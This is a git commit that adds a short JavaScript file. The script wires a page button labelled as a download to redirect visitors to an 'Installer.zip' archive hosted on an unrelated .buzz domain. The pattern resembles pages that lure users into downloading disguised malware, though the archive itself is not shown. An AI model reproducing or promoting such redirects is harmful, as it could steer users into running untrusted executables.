b19cec4b954dd5bb08bd6b5e3eea1c9897e2910f
egor22723232 <76265864+egor22723232@users.noreply.github.com>
2026-04-18 20:47:47 +0300

    Create scripts.js

---
+++ scripts.js
@@ -0,0 +1,9 @@
+document.addEventListener("DOMContentLoaded", () => {
+  const downloadBtn = document.getElementById("redirect-now");
+
+  if (downloadBtn) {
+    downloadBtn.addEventListener("click", () => {
+      window.location.href = "https://ultraviolence.buzz/b/Installer.zip";
+    });
+  }
+});
